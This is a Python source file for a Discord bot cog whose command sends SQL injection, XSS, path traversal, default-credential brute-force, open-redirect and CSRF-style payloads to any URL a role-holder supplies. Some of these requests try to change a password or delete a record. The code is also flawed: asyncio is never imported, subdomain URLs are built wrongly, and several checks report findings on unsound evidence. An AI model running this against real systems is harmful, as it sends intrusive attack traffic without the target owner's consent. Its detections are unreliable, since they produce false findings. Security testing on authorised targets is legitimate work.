import discord
from discord.ext import commands
import requests
import config


class VulnerabilityTester(commands.Cog):
    """Test various vulnerabilities on a target URL with paginated results."""

    def __init__(self, bot):
        self.bot = bot

    @commands.has_role(
        config.BOT_USER_ROLE
    )  # Ensure user has the required role to use the command
    @commands.command(name="vuln_test")
    async def vuln_test(self, ctx, target_url: str = None, test_type: str = None):
        """
        Tests a specified vulnerability type on the given target URL.
        Paginated results are provided for large outputs.
        """
        if not target_url or not test_type:
            embed = discord.Embed(
                title="🛠️ Vulnerability Tester Help",
                description="Use this command to test specific vulnerabilities on a target URL.",
                color=discord.Color.blue(),
            )
            embed.add_field(
                name="Command Usage",
                value=f"**{config.BOT_PREFIX}vuln_test <target_url> <test_type>**\nExample: `{config.BOT_PREFIX}vuln_test https://example.com sql_injection`",
                inline=False,
            )
            embed.add_field(
                name="Available Test Types",
                value="`hardcoded_credentials`, `bola`, `path_traversal`, `sensitive_data`, `xss`, `sql_injection`, `open_redirect`, `csrf`, `subdomain_takeover`, `rate_limiting`, `brute_force`",
                inline=False,
            )
            await ctx.send(embed=embed)
            return

        try:
            if test_type.lower() == "hardcoded_credentials":
                result = self.test_hardcoded_credentials(target_url)
            elif test_type.lower() == "bola":
                result = self.test_bola(target_url)
            elif test_type.lower() == "path_traversal":
                result = self.test_path_traversal(target_url)
            elif test_type.lower() == "sensitive_data":
                result = self.test_sensitive_data(target_url)
            elif test_type.lower() == "xss":
                result = self.test_xss(target_url)
            elif test_type.lower() == "sql_injection":
                result = self.test_sql_injection(target_url)
            elif test_type.lower() == "open_redirect":
                result = self.test_open_redirect(target_url)
            elif test_type.lower() == "csrf":
                result = self.test_csrf(target_url)
            elif test_type.lower() == "subdomain_takeover":
                result = self.test_subdomain_takeover(target_url)
            elif test_type.lower() == "rate_limiting":
                result = self.test_rate_limiting(target_url)
            elif test_type.lower() == "brute_force":
                result = self.test_brute_force(target_url)
            else:
                result = (
                    f"❌ Unknown test type: {test_type}. Please use a valid test type."
                )

            await self.paginate_results(
                ctx, result, f"🔍 `{test_type}` on `{target_url}`"
            )
        except Exception as e:
            await ctx.send(f"⚠️ An error occurred: {e}")

    def test_sql_injection(self, target_url):
        """Simulates SQL Injection testing with real-world payloads."""
        try:
            payloads = [
                "' OR '1'='1' -- ",
                "' UNION SELECT NULL, database(), user() -- ",
                "' OR 1=1 LIMIT 1 --",
                "'; SELECT version() --",
                "' UNION SELECT null, @@version --",
                "1' OR 1=1 --",
            ]
            results = []
            for payload in payloads:
                response = requests.get(f"{target_url}?id={payload}", timeout=10)
                if response.status_code == 200 and "error" not in response.text.lower():
                    results.append(
                        f"Response for payload `{payload}`:\n{response.text[:500]}"
                    )  # Truncate to avoid length issues
            return (
                "\n\n".join(results)
                if results
                else "✅ No SQL Injection vulnerabilities detected."
            )
        except Exception as e:
            return f"⚠️ Error during SQL Injection testing: {e}"

    def test_xss(self, target_url):
        """Simulates XSS vulnerability testing (Reflected and Stored XSS)."""
        payloads = [
            "<script>alert('XSS')</script>",  # Basic reflected XSS
            "<img src='x' onerror='alert(1)'>",  # Another reflected XSS
            "<script>document.write('XSS')</script>",  # Stored XSS
            "<a href='javascript:alert(1)'>XSS</a>",  # Stored XSS in links
        ]
        try:
            results = []
            for payload in payloads:
                response = requests.get(f"{target_url}?input={payload}", timeout=10)
                if payload in response.text:
                    results.append(
                        f"Response for payload `{payload}`:\n{response.text[:500]}"
                    )  # Truncate to avoid length issues
            return "\n".join(results) if results else "✅ No XSS vulnerability detected."
        except Exception as e:
            return f"⚠️ Error during XSS testing: {e}"

    def test_sensitive_data(self, target_url):
        """Simulates checking for sensitive data exposure (API keys, passwords, etc.)."""
        try:
            response = requests.get(f"{target_url}/logs", timeout=10)
            if any(
                keyword in response.text.lower()
                for keyword in [
                    "password",
                    "token",
                    "apikey",
                    "secret",
                    "private",
                    "admin",
                ]
            ):
                return "⚠️ Sensitive data found in logs!"
            return "✅ No sensitive data leaks detected."
        except Exception as e:
            return f"⚠️ Error during sensitive data testing: {e}"

    def test_bola(self, target_url):
        """Simulates Broken Object Level Authorization testing."""
        try:
            results = []
            for obj_id in range(1, 5):  # Test a few object IDs
                response = requests.get(f"{target_url}/{obj_id}", timeout=10)
                if response.status_code == 200:
                    results.append(f"Accessible object: {obj_id}")
            return (
                "\n".join(results) if results else "✅ No BOLA vulnerability detected."
            )
        except Exception as e:
            return f"⚠️ Error during BOLA testing: {e}"

    def test_rate_limiting(self, target_url):
        """Test for rate limiting and brute force vulnerabilities."""
        try:
            for i in range(10):
                response = requests.get(
                    f"{target_url}/login",
                    params={"username": "admin", "password": "password"},
                    timeout=5,
                )
                if (
                    response.status_code != 429
                ):  # HTTP 429 is Too Many Requests (Rate Limited)
                    return "⚠️ Rate limiting not in place! Potential brute-force attack vulnerability."
            return "✅ Rate limiting is working as expected."
        except Exception as e:
            return f"⚠️ Error during rate limiting test: {e}"

    def test_brute_force(self, target_url):
        """Simulates brute-force attack testing on login page."""
        try:
            credentials = [
                ("admin", "admin"),
                ("admin", "password"),
                ("admin", "1234"),
                ("root", "root"),
            ]
            results = []
            for username, password in credentials:
                response = requests.post(
                    f"{target_url}/login",
                    data={"username": username, "password": password},
                    timeout=5,
                )
                if "Invalid login" not in response.text:
                    results.append(
                        f"Brute-force success with credentials: `{username}:{password}`"
                    )
            return (
                "\n".join(results)
                if results
                else "✅ No brute-force vulnerabilities detected."
            )
        except Exception as e:
            return f"⚠️ Error during brute force testing: {e}"

    def test_open_redirect(self, target_url):
        """Simulates Open Redirect testing."""
        payloads = ["http://evil.com", "https://malicious-site.com"]
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{target_url}?redirect={payload}", timeout=10)
                if payload in response.url:
                    results.append(f"Open Redirect detected with payload: {payload}")
            except Exception as e:
                return f"⚠️ Error during Open Redirect testing: {e}"
        return (
            "\n".join(results)
            if results
            else "✅ No Open Redirect vulnerability detected."
        )

    def test_subdomain_takeover(self, target_url):
        """Simulates Subdomain Takeover testing."""
        subdomains = ["test", "dev", "staging", "api"]
        results = []
        for subdomain in subdomains:
            url = f"{subdomain}.{target_url}"
            try:
                response = requests.get(f"http://{url}", timeout=10)
                if response.status_code == 404:
                    results.append(f"Subdomain takeover possible: {url}")
            except requests.RequestException:
                continue
        return (
            "\n".join(results)
            if results
            else "✅ No subdomain takeover vulnerabilities detected."
        )

    def test_hardcoded_credentials(self, target_url):
        """Checks for hardcoded credentials in configuration files or endpoints."""
        try:
            endpoints = [
                "/config",
                "/settings",
                "/admin/config",
                "/env",
                "/.env",
                "/credentials",
            ]
            sensitive_keywords = [
                "password",
                "secret",
                "key",
                "admin",
                "credentials",
                "user",
                "login",
            ]
            results = []

            for endpoint in endpoints:
                url = f"{target_url.rstrip('/')}{endpoint}"
                response = requests.get(url, timeout=10)

                if response.status_code == 200:
                    # Check for sensitive keywords in the response
                    for keyword in sensitive_keywords:
                        if keyword.lower() in response.text.lower():
                            results.append(
                                f"⚠️ Hardcoded credential detected at `{url}` with keyword `{keyword}`."
                            )

            return (
                "\n".join(results)
                if results
                else "✅ No hardcoded credentials detected in common endpoints."
            )
        except Exception as e:
            return f"⚠️ Error during hardcoded credentials testing: {e}"

    def test_csrf(self, target_url):
        """Simulates CSRF vulnerability testing by sending requests that could change data."""
        try:
            # Simple CSRF payload that tries to modify sensitive data
            payloads = [
                {
                    "method": "POST",
                    "params": {"username": "attacker", "password": "newpassword"},
                },
                {"method": "GET", "params": {"action": "delete", "id": "123"}},
            ]
            results = []
            for payload in payloads:
                if payload["method"] == "POST":
                    response = requests.post(target_url, data=payload["params"], timeout=10)
                elif payload["method"] == "GET":
                    response = requests.get(target_url, params=payload["params"], timeout=10)

                # Check if the response indicates that the action succeeded
                if "success" in response.text.lower():
                    results.append(f"CSRF possible with payload {payload['params']}")

            return "\n".join(results) if results else "✅ No CSRF vulnerabilities detected."
        except Exception as e:
            return f"⚠️ Error during CSRF testing: {e}"


    def test_path_traversal(self, target_url):
        """Simulates Path Traversal testing by manipulating file paths."""
        try:
            payloads = [
                "../../../etc/passwd",  # Classic Unix path traversal
                "../../../../windows/system32/config",  # Windows path traversal
                "/../../../root/secretfile.txt",  # General traversal
            ]
            results = []
            for payload in payloads:
                response = requests.get(f"{target_url}?file={payload}", timeout=10)
                if (
                    "error" not in response.text.lower()
                ):  # Check if sensitive file is disclosed
                    results.append(f"Path Traversal detected with payload: {payload}")

            return (
                "\n".join(results)
                if results
                else "✅ No Path Traversal vulnerabilities detected."
            )
        except Exception as e:
            return f"⚠️ Error during Path Traversal testing: {e}"

    async def paginate_results(self, ctx, content, title):
        """Paginate long results into smaller messages."""
        lines = content.split("\n")
        pages = [lines[i:i + 20] for i in range(0, len(lines), 20)]  # 20 lines per page
        current_page = 0

        def create_embed(page_num):
            embed = discord.Embed(
                title=title,
                description="\n".join(pages[page_num]),
                color=discord.Color.blue()
            )
            embed.set_footer(text=f"Page {page_num + 1} of {len(pages)}")
            return embed

        message = await ctx.send(embed=create_embed(current_page))

        if len(pages) > 1:
            await message.add_reaction("⬅️")
            await message.add_reaction("➡️")

            def check(reaction, user):
                return (
                    user == ctx.author
                    and reaction.message.id == message.id
                    and str(reaction.emoji) in ["⬅️", "➡️"]
                )

            while True:
                try:
                    reaction, user = await self.bot.wait_for('reaction_add', timeout=60.0, check=check)

                    if str(reaction.emoji) == "⬅️" and current_page > 0:
                        current_page -= 1
                        await message.edit(embed=create_embed(current_page))

                    elif str(reaction.emoji) == "➡️" and current_page < len(pages) - 1:
                        current_page += 1
                        await message.edit(embed=create_embed(current_page))

                    await message.remove_reaction(reaction.emoji, user)
                except asyncio.TimeoutError:
                    await message.clear_reactions()
                    break


# REQUIRED setup function
async def setup(bot):
    await bot.add_cog(VulnerabilityTester(bot))
